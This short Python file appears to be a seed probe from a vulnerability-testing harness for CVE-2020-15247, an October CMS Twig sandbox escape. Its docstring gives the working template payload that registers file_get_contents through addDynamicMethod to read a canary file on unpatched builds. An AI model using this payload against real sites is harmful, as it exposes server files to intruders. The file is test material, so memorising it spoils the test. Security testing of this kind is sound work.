#!/usr/bin/env python3
"""[GIVEN] CVE-2020-15247 seed exploit -- Twig sandbox escape via addDynamicMethod.

October CMS objects extend Extendable (which has addDynamicMethod). In Twig
templates, ``this.page`` exposes the Page model. Before Build 469, no
SecurityPolicy existed, so calling addDynamicMethod to register a PHP callable
(here file_get_contents) and invoking it worked freely.

The CMS page at /canary-original contains:
  {{ this.page.addDynamicMethod('readCanary', 'file_get_contents') }}
  {{ this.page.readCanary('/var/canary.txt') }}

Contract: reaches the canary on V0 (Build 468, no SecurityPolicy);
BLOCKED on V1 (Build 469, SecurityPolicy blocks addDynamicMethod).
"""
from __future__ import annotations

PATH = "/canary-original"


def candidate() -> dict:
    """The request candidate for this seed."""
    return {
        "probe_id": "cve-2020-15247-addDynamicMethod",
        "method": "GET",
        "path": PATH,
    }


if __name__ == "__main__":
    print(candidate()["path"])
